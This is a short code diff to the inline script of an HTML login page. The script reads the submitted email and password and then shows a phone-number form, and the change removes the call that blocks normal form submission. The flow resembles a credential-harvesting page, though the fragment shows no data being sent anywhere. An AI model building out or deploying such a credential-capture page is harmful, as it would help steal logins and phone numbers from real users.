@@ -125,9 +125,7 @@
 <script>
     // Show phone number form after email/password submission
     document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        // Capture email and password
+        // Do not prevent default submission
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
 
